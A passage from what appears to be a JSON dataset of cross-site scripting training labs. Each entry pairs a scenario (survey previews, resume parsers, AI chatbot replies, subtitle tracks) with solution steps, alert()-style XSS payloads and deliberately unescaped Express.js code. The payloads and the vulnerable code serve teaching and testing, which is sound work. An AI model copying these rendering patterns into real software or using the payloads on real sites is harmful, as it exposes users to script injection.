      "srcCode": "app.get('/dashboard', (req, res) => {\n  const filter = req.query.filter || 'Default';\n  res.send(`\n    <html>\n      <body>\n        <h3>Active Filter: <span id='filt'>${filter}</span></h3>\n        <script>\n          document.getElementById('filt').innerHTML = '${filter}';\n        </script>\n      </body>\n    </html>\n  `);\n});"
    },
    {
      "Lab scenario": "Reflected XSS via Error Logging Endpoint",
      "Lab Description": "A developer debugging panel reflects error messages in real-time using query parameters. When a script fails, the message is passed via the URL and rendered without sanitization into the page. This can be exploited by injecting JavaScript into the `msg` parameter.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Access `/log-error?msg=<script>alert(1)</script>`.",
        "Inspect how the message is injected into the DOM (e.g., via innerHTML).",
        "Confirm the JavaScript executes when viewing the error log.",
        "Test variations like <img> and <svg> tags in the parameter."
      ],
      "payloads": [
        "<script>alert('log')</script>",
        "<img src=x onerror=alert('error')>",
        "<svg/onload=alert('debug')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/log-error', (req, res) => {\n  const msg = req.query.msg || 'Unknown error';\n  res.send(`\n    <html>\n      <body>\n        <h2>Error Log:</h2>\n        <div>${msg}</div>\n      </body>\n    </html>\n  `);\n});"
    },
    {
      "Lab scenario": "XSS in Survey Form Builder Preview",
      "Lab Description": "A survey creation tool lets users preview their forms. The form fields are built dynamically from user inputs (question titles, button labels, etc.) and rendered using innerHTML. This exposes the system to XSS if a malicious input is added in the preview stage.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a new survey and add a question with `<img src=x onerror=alert(1)>`.",
        "Use the 'Preview Survey' button to load the preview.",
        "Confirm the malicious input is rendered and executed inside the DOM.",
        "Verify the form preview allows full HTML injection without escaping."
      ],
      "payloads": [
        "<script>alert('survey')</script>",
        "<img src=x onerror=alert('form')>",
        "<svg/onload=alert('preview')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet formPreview = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-survey', (req, res) => {\n  formPreview = req.body.question;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Survey Preview</h2>\n        <div>${formPreview}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Admin Report Export Viewer",
      "Lab Description": "An internal admin panel allows exported report files (JSON) to be viewed in the browser. The system parses the JSON and injects the content directly into the page. Malicious entries inside the JSON can lead to XSS if not properly escaped before rendering.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a report containing values like `<img src=x onerror=alert(1)>` as field data.",
        "Load the export viewer page and select the uploaded report.",
        "Observe that the report content is injected into a div using innerHTML.",
        "Confirm script execution when the page renders."
      ],
      "payloads": [
        "<script>alert('report')</script>",
        "<img src=x onerror=alert('viewer')>",
        "<svg/onload=alert('admin')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/view-report', (req, res) => {\n  const report = JSON.parse(fs.readFileSync('./data/report.json'));\n  const html = Object.values(report).map(v => `<div>${v}</div>`).join('');\n  res.send(`<html><body><h2>Report</h2>${html}</body></html>`);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS in Email Template Preview with Merge Tags",
      "Lab Description": "A marketing automation platform allows users to build email templates using merge tags like {{user.name}}. When previewing an email, the system renders these values using innerHTML without escaping. If an attacker injects HTML or JavaScript in the name field, it leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Register an account and set the profile name to `<img src=x onerror=alert(1)>`.",
        "Access the email builder and insert the merge tag `{{user.name}}`.",
        "Click the 'Preview Email' button.",
        "Observe the unescaped rendering of the name in the preview, triggering the payload."
      ],
      "payloads": [
        "<img src=x onerror=alert('merge tag')>",
        "<script>alert('email preview')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet user = { name: '<img src=x onerror=alert(1)>' };\napp.get('/preview', (req, res) => {\n  const emailTemplate = `<h1>Hello {{user.name}}</h1>`;\n  const rendered = emailTemplate.replace('{{user.name}}', user.name);\n  res.send(`<html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Third-Party Widget Configuration Interface",
      "Lab Description": "A SaaS dashboard allows users to embed third-party widgets by providing a custom name and HTML snippet. The snippet is injected into an iframe for rendering, but the widget name is rendered directly in the parent DOM. Improper sanitization of the name field causes a reflected XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Configure a widget and set its name as `<svg/onload=alert(1)>`.",
        "Navigate to the dashboard view that renders the widget.",
        "Observe that the parent page injects the name via innerHTML.",
        "Confirm that the payload executes when the widget is loaded."
      ],
      "payloads": [
        "<svg/onload=alert('widget')>",
        "<script>alert('iframe parent')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/widget', (req, res) => {\n  const widgetName = req.query.name || 'Default Widget';\n  res.send(`\n    <html>\n      <body>\n        <h2>Now Showing: <span id='title'></span></h2>\n        <iframe src='/widget-content'></iframe>\n        <script>\n          document.getElementById('title').innerHTML = '${widgetName}';\n        </script>\n      </body>\n    </html>\n  `);\n});"
    },
    {
      "Lab scenario": "XSS in AI Chatbot Response Rendering",
      "Lab Description": "An internal HR portal integrates an AI assistant that displays formatted chatbot responses. The backend sends responses as HTML to support formatting. Due to lack of sanitization, specially crafted user questions can poison the output with malicious script, leading to XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a question like `What is <img src=x onerror=alert(1)>?` to the chatbot.",
        "Observe the assistant echoing and formatting your question.",
        "Check that the assistant UI injects this output via `.innerHTML`.",
        "Confirm JavaScript execution in the chat pane."
      ],
      "payloads": [
        "<img src=x onerror=alert('chatbot')>",
        "<script>alert('HR bot')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  const msg = req.query.q || 'Hello';\n  const botReply = `You asked: ${msg}`;\n  res.send(`<html><body><div id='chat'></div>\n    <script>\n      document.getElementById('chat').innerHTML = '${botReply}';\n    </script>\n  </body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Resume Parser Tool for Job Portal",
      "Lab Description": "An online recruitment portal parses resumes and shows key fields (name, title, skills) in a review panel. If a user uploads a resume with a malicious name or skill value, the data is rendered into the DOM via innerHTML during the recruiter review phase.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a fake resume with name or skills like `<img src=x onerror=alert(1)>`.",
        "Upload the resume to the portal.",
        "Login as a recruiter and open the applicant\u00e2\u20ac\u2122s profile.",
        "Observe the XSS triggering on the review panel load."
      ],
      "payloads": [
        "<img src=x onerror=alert('resume')>",
        "<script>alert('job')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/review', (req, res) => {\n  const applicant = { name: '<img src=x onerror=alert(1)>', skill: 'HTML' };\n  res.send(`\n    <html><body>\n      <h3>Candidate: <span>${applicant.name}</span></h3>\n      <p>Skills: <span>${applicant.skill}</span></p>\n    </body></html>\n  `);\n});"
    },
    {
      "Lab scenario": "XSS via Event Tracking Dashboard Tooltip",
      "Lab Description": "An analytics tool shows live user activity on a map. Hovering over a session point displays user-agent and location in a tooltip. If user-agent is not sanitized, a malicious user can inject payloads via browser headers to trigger XSS in the map UI.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a request with a User-Agent header like `<img src=x onerror=alert(1)>`.",
        "Trigger an event capture (e.g., login or click).",
        "Visit the analytics dashboard as an admin.",
        "Hover over your recorded session to view the tooltip.",
        "Confirm XSS triggers from tooltip rendering."
      ],
      "payloads": [
        "<img src=x onerror=alert('tooltip')>",
        "<script>alert('UA header')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/track', (req, res) => {\n  const ua = req.headers['user-agent'];\n  sessions.push({ ua });\n  res.send('OK');\n});\n\napp.get('/admin', (req, res) => {\n  const tooltips = sessions.map(s => `<div class='tooltip'>${s.ua}</div>`).join('');\n  res.send(`<html><body>${tooltips}</body></html>`);\n});\n\nconst sessions = [];\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in User Feedback Print Preview Panel",
      "Lab Description": "An internal feedback tool allows managers to print submitted feedback for offline review. When a feedback entry is selected, the system loads it into a print preview modal using innerHTML. Input from users is not sanitized, allowing stored XSS when feedback is rendered for printing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback as a regular user with malicious input like `<img src=x onerror=alert(1)>`.",
        "Login as a manager and open the Print Feedback section.",
        "Click on your submitted entry to load it into the preview.",
        "Confirm that the payload executes in the print preview modal."
      ],
      "payloads": [
        "<img src=x onerror=alert('feedback')>",
        "<script>alert('preview')</script>",
        "<svg/onload=alert('print')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  feedbacks.push(req.body.text);\n  res.send('Submitted');\n});\n\napp.get('/print-preview/:id', (req, res) => {\n  const entry = feedbacks[req.params.id];\n  res.send(`\n    <html><body>\n      <h2>Print Preview</h2>\n      <div id='preview'></div>\n      <script>\n        document.getElementById('preview').innerHTML = '${entry}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Issue Tracker Markdown Preview Panel",
      "Lab Description": "A project management system includes a Markdown editor with a live preview for issue descriptions. The server renders Markdown to HTML without sanitizing raw HTML inside the input, allowing script tags and event handlers to be injected through formatted issue reports.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the new issue form and enter a payload like `<img src=x onerror=alert(1)>` in the description field.",
        "Switch to the 'Preview' tab to see how it renders.",
        "The rendered HTML is inserted directly into the DOM without escaping.",
        "Observe the execution of your XSS payload in the preview panel."
      ],
      "payloads": [
        "<img src=x onerror=alert('markdown')>",
        "<script>alert('preview')</script>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-markdown', (req, res) => {\n  const html = marked(req.body.markdown); // No sanitization\n  res.send(`<html><body><div>${html}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Notification Message Renderer via API Hook",
      "Lab Description": "An internal platform allows third-party services to send messages to a notification widget using a POST API. These messages are shown in the UI using `.innerHTML`. An attacker exploiting an API integration can send malicious HTML that triggers XSS when a user views their notifications.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a POST request to the /send-message endpoint with a payload like `<svg/onload=alert(1)>`.",
        "Access the /dashboard as a logged-in user.",
        "Observe the unsanitized message being rendered into the notification box.",
        "Confirm that the XSS payload executes within the UI."
      ],
      "payloads": [
        "<svg/onload=alert('notification')>",
        "<script>alert('notify')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet messages = [];\napp.use(bodyParser.json());\n\napp.post('/send-message', (req, res) => {\n  messages.push(req.body.text);\n  res.send('Message queued');\n});\n\napp.get('/dashboard', (req, res) => {\n  const rendered = messages.map(m => `<div class='msg'>${m}</div>`).join('');\n  res.send(`<html><body><h2>Notifications</h2>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in E-Commerce Order Notes Renderer",
      "Lab Description": "A back-office admin panel for an e-commerce store allows customers to add order notes. These notes are later displayed to the admin using innerHTML. An attacker can place a payload in the note during checkout that results in stored XSS when the admin views the order.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Place an order with a malicious note like `<img src=x onerror=alert(1)>`.",
        "Login as admin and open the order details page.",
        "The note is shown in a section that renders innerHTML.",
        "Observe that the script executes in the admin's context."
      ],
      "payloads": [
        "<img src=x onerror=alert('order')>",
        "<script>alert('admin view')</script>",
        "<svg/onload=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet orders = [{ note: '<img src=x onerror=alert(1)>' }];\n\napp.get('/admin/order/:id', (req, res) => {\n  const note = orders[req.params.id].note;\n  res.send(`<html><body><h3>Customer Note</h3><div>${note}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Chat System Mention Renderer",
      "Lab Description": "A real-time chat system allows users to mention others using @username. Mentions are converted into profile links and displayed via innerHTML in the message thread. If a malicious user sets their username to a payload, it can result in stored XSS when others view the message.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a user with a username like `<img src=x onerror=alert(1)>`.",
        "Send a message mentioning yourself (@<payload>).",
        "When other users open the chat, the mention gets rendered via innerHTML.",
        "Observe the payload triggering on message view."
      ],
      "payloads": [
        "<img src=x onerror=alert('mention')>",
        "<script>alert('chat')</script>",
        "<svg/onload=alert('msg')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet users = [{ username: '<img src=x onerror=alert(1)>' }];\nlet messages = [`@<img src=x onerror=alert(1)> hello`];\n\napp.get('/chat', (req, res) => {\n  const chat = messages.map(msg => `<p>${msg}</p>`).join('');\n  res.send(`<html><body><div>${chat}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Real-Time Task Board via WebSocket Broadcast",
      "Lab Description": "A team collaboration tool uses WebSockets to broadcast real-time task updates. When a task is updated, the title is sent to all clients and rendered using innerHTML in the task board. No input validation is performed, allowing an attacker to send a task update with a script payload that executes on all clients.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Connect to the WebSocket and send a task update containing a payload like `<script>alert(1)</script>`.",
        "All connected clients automatically receive and render the update using innerHTML.",
        "The payload is executed on all connected clients."
      ],
      "payloads": [
        "<script>alert('ws-xss')</script>",
        "<img src=x onerror=alert('realtime')>",
        "<svg/onload=alert('broadcast')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', function connection(ws) {\n  ws.on('message', function incoming(message) {\n    wss.clients.forEach(function each(client) {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(`<div>${message}</div>`);\n      }\n    });\n  });\n});"
    },
    {
      "Lab scenario": "XSS in Drag-and-Drop File Uploader Preview",
      "Lab Description": "A media management app previews filenames uploaded through a drag-and-drop interface. The filenames are directly rendered into the DOM via innerHTML without sanitization. A specially crafted filename with HTML/JS can trigger XSS during preview.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload a file with a malicious name such as `<img src=x onerror=alert(1)>.jpg`.",
        "Observe how the filename is rendered in the UI using innerHTML.",
        "The payload in the filename triggers when the preview is shown."
      ],
      "payloads": [
        "<img src=x onerror=alert('upload')>.jpg",
        "<svg/onload=alert('file')>.png",
        "<script>alert('dropzone')</script>.txt"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const filename = req.file.originalname;\n  res.send(`\n    <html><body>\n      <h2>Uploaded Files</h2>\n      <div id='preview'></div>\n      <script>\n        document.getElementById('preview').innerHTML = '${filename}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Email Template Editor with Dynamic Variables",
      "Lab Description": "An email marketing platform allows users to design templates and preview them with dynamic variables like {{user.name}}. A preview engine substitutes variables with user-provided data and renders the email content with innerHTML. If user data includes malicious HTML, XSS occurs in the preview.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a test user with the name `<script>alert(1)</script>`.",
        "Use a template like 'Hi {{user.name}}, welcome!'.",
        "Click on 'Preview' and observe the payload execution due to unsafe rendering."
      ],
      "payloads": [
        "<script>alert('template')</script>",
        "<img src=x onerror=alert('preview')>",
        "<svg/onload=alert('dynamic')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet user = { name: '<script>alert(1)</script>' };\nlet template = 'Hi {{user.name}}, welcome!';\n\napp.get('/preview-email', (req, res) => {\n  const rendered = template.replace('{{user.name}}', user.name);\n  res.send(`<html><body><div id='email'>${rendered}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Dynamic Tooltip Library with Data Attributes",
      "Lab Description": "A dashboard uses a tooltip library that reads content from `data-tooltip` attributes and sets it using `.innerHTML` inside a floating div. An attacker can inject HTML content into the `data-tooltip` attribute via an input field, leading to XSS when the user hovers over the element.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit data with a malicious string in a tooltip-bound input.",
        "Hover over the element to trigger the tooltip.",
        "The tooltip engine reads the `data-tooltip` and injects it as innerHTML.",
        "Observe payload execution."
      ],
      "payloads": [
        "\" onmouseover=alert('tooltip') x=\"",
        "\"><svg/onload=alert('hover')>",
        "<img src=x onerror=alert('data-tooltip')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet items = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-item', (req, res) => {\n  items.push(req.body.name);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const content = items.map(i => `<div data-tooltip='${i}'>${i}</div>`).join('');\n  res.send(`<html><body>${content}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Video Player Custom Subtitle Track",
      "Lab Description": "A video streaming platform allows users to upload custom subtitle files which are rendered as captions. When rendering the caption preview, the system uses innerHTML to inject the subtitle line directly into a DOM element. A malicious subtitle line can inject and execute arbitrary scripts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a subtitle file with a line like `<script>alert(1)</script>`.",
        "Load the video and enable the custom subtitle track.",
        "When the line plays, it is injected via innerHTML.",
        "Observe the payload execution."
      ],
      "payloads": [
        "<script>alert('subtitle')</script>",
        "<img src=x onerror=alert('caption')>",
        "<svg/onload=alert('video-xss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet subtitleLine = '<script>alert(1)</script>';\n\napp.get('/video', (req, res) => {\n  res.send(`\n    <html><body>\n      <video src='video.mp4' controls></video>\n      <div id='caption'></div>\n      <script>\n        document.getElementById('caption').innerHTML = '${subtitleLine}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in AI Chatbot Summary Feature",
      "Lab Description": "A SaaS application integrates an AI chatbot that summarizes user conversations and stores them in a dashboard. The summary text is rendered using innerHTML for rich formatting. If a malicious input is added to the chat and reflected in the summary, it can trigger XSS in the dashboard view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message containing a payload like `<img src=x onerror=alert(1)>` to the chatbot.",
        "Allow the AI to generate a summary that includes the malicious input.",
        "Open the dashboard where summaries are rendered using innerHTML.",
        "Observe XSS execution."
      ],
      "payloads": [
        "<img src=x onerror=alert('chatbot-xss')>",
        "<svg/onload=alert('summary')>",
        "<script>alert('ai-summary')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet summaries = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chat', (req, res) => {\n  const message = req.body.message;\n  // Simulated summary process\n  const summary = `Summary: ${message}`;\n  summaries.push(summary);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const html = summaries.map(s => `<div class='summary'>${s}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in E-commerce Invoice Note Field",
      "Lab Description": "An e-commerce admin panel allows staff to add internal notes to invoices. These notes are later rendered inside a modal popup using innerHTML when the invoice is viewed. A malicious staff user can inject an XSS payload via the note field, affecting any admin who views the invoice.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an internal note like `<script>alert('invoice')</script>`.",
        "View the invoice as another user or refresh the page.",
        "Observe XSS execution in the modal."
      ],
      "payloads": [
        "<script>alert('invoice')</script>",
        "<img src=x onerror=alert('note')>",
        "<svg/onload=alert('admin-xss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  note = req.body.note;\n  res.redirect('/invoice');\n});\n\napp.get('/invoice', (req, res) => {\n  res.send(`\n    <html><body>\n      <button onclick=\"document.getElementById('modal').style.display='block'\">View Note</button>\n      <div id='modal' style='display:none;'>${note}</div>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Project Management Mention System",
      "Lab Description": "A project management tool allows users to tag teammates using `@username` in comments. Mentions are converted to HTML spans with innerHTML for profile popups. An attacker can bypass mention sanitization by including HTML in their comment, leading to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a comment like `@<img src=x onerror=alert(1)>`.",
        "Mention is converted and rendered using innerHTML.",
        "Visit the task or thread and observe the payload triggering."
      ],
      "payloads": [
        "@<img src=x onerror=alert('mention-xss')>",
        "@<svg/onload=alert('project')>",
        "@<script>alert('tag')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/task');\n});\n\napp.get('/task', (req, res) => {\n  const rendered = comments.map(c => `<div>${c.replace(/@([a-zA-Z0-9]+)/g, '<span class=\"mention\">@$1</span>')}</div>`).join('');\n  res.send(`<html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in LMS Code Submission Feedback Section",
      "Lab Description": "A Learning Management System (LMS) lets students submit code assignments and receive feedback. Instructor comments are shown next to the code using innerHTML. If an instructor accidentally includes unsafe HTML or JavaScript in the feedback, XSS can be triggered when students view it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an assignment and trigger feedback with `<script>alert(1)</script>`.",
        "Open the feedback section as a student.",
        "Observe the execution of the malicious feedback."
      ],
      "payloads": [
        "<script>alert('lms')</script>",
        "<img src=x onerror=alert('feedback')>",
        "<svg/onload=alert('submission-xss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet feedback = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  feedback = req.body.comment;\n  res.redirect('/submission');\n});\n\napp.get('/submission', (req, res) => {\n  res.send(`<html><body><h3>Your Feedback</h3><div>${feedback}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Collaborative Markdown Editor with Preview",
      "Lab Description": "A collaborative documentation tool uses a Markdown editor and allows users to preview the rendered HTML. The Markdown engine fails to sanitize raw HTML tags, so a user can insert `<script>` tags directly. When another collaborator opens the preview, XSS is triggered.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Insert raw HTML like `<script>alert(1)</script>` into a Markdown note.",
        "Click on 'Preview' or share the note with another user.",
        "Observe execution of the script in the rendered preview."
      ],
      "payloads": [
        "<script>alert('markdown')</script>",
        "<img src=x onerror=alert('doc-preview')>",
        "<svg/onload=alert('collab-xss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst marked = require('marked');\nconst app = express();\n\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save', (req, res) => {\n  note = req.body.md;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  const html = marked(note);\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Custom CRM Search Autocomplete",
      "Lab Description": "A custom-built CRM system includes a search bar with autocomplete suggestions for contacts. The suggestions are injected via JavaScript into the DOM without proper sanitization. An attacker can inject malicious scripts via a contact\u00e2\u20ac\u2122s name, which is then shown as part of the autocomplete dropdown.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a contact with a name containing a payload like `<img src=x onerror=alert(1)>`.",
        "Start typing the contact name in the CRM search bar.",
        "Observe XSS triggered in the autocomplete suggestion."
      ],
      "payloads": [
        "<img src=x onerror=alert('crm-xss')>",
        "<svg/onload=alert('autocomplete')>",
        "<script>alert('search')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet contacts = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-contact', (req, res) => {\n  contacts.push(req.body.name);\n  res.redirect('/search');\n});\n\napp.get('/search', (req, res) => {\n  const script = `\n    <script>\n      const data = ${JSON.stringify(contacts)};\n      document.addEventListener('DOMContentLoaded', () => {\n        const box = document.getElementById('suggestions');\n        box.innerHTML = data.map(d => '<div>' + d + '</div>').join('');\n      });\n    </script>`;\n  res.send(`<html><body><input type='text' /><div id='suggestions'></div>${script}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in SaaS Admin Analytics Embed Tool",
      "Lab Description": "A SaaS platform allows admins to embed custom analytics widgets using raw HTML snippets. These snippets are stored and injected into the dashboard. If an attacker saves a malicious script in the embed HTML, it will execute when the dashboard loads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to the analytics embed settings and add a payload like `<script>alert(1)</script>`.",
        "Visit the dashboard where the widget renders.",
        "Observe XSS execution from the embedded content."
      ],
      "payloads": [
        "<script>alert('embed-xss')</script>",
        "<img src=x onerror=alert('widget')>",
        "<svg/onload=alert('dashboard')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet widgetHTML = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save-widget', (req, res) => {\n  widgetHTML = req.body.html;\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send(`<html><body><h3>Analytics</h3>${widgetHTML}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Mobile Push Notification Preview",
      "Lab Description": "An admin interface for sending mobile push notifications displays a preview before sending. The message is rendered using innerHTML to simulate what users would see. If the admin inserts an HTML payload, it executes in the preview, causing an XSS vulnerability.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a notification message with `<img src=x onerror=alert(1)>`.",
        "Click 'Preview' in the push notification interface.",
        "Observe the script execution in the preview section."
      ],
      "payloads": [
        "<img src=x onerror=alert('push-xss')>",
        "<svg/onload=alert('preview')>",
        "<script>alert('mobile')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet preview = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/preview', (req, res) => {\n  preview = req.body.message;\n  res.redirect('/push');\n});\n\napp.get('/push', (req, res) => {\n  res.send(`<html><body><h4>Notification Preview</h4><div>${preview}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Email Template Test Renderer",
      "Lab Description": "A web platform lets users build and preview email templates. When testing, the email content is rendered using innerHTML to simulate appearance. If malicious HTML is added to the content body, it results in XSS during the test render.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create an email template with `<svg/onload=alert(1)>`.",
        "Open the test render preview.",
        "Observe script execution from the malicious input."
      ],
      "payloads": [
        "<svg/onload=alert('email-xss')>",
        "<img src=x onerror=alert('template')>",
        "<script>alert('render')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet emailBody = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/template', (req, res) => {\n  emailBody = req.body.body;\n  res.redirect('/test-email');\n});\n\napp.get('/test-email', (req, res) => {\n  res.send(`<html><body><div>${emailBody}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Product Customizer Live Preview",
      "Lab Description": "An online merchandise store includes a live preview feature for customizing t-shirts with text. The text input is rendered into the preview using innerHTML. Injecting HTML tags in the input results in XSS execution during live preview rendering.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter a custom text such as `<script>alert(1)</script>`.",
        "Observe the text rendered on the t-shirt preview area.",
        "The script is executed when the DOM renders the input."
      ],
      "payloads": [
        "<script>alert('preview-xss')</script>",
        "<img src=x onerror=alert('customizer')>",
        "<svg/onload=alert('shirt')>"
      ],
      "Vulnerability name": "Cross-site scripting",
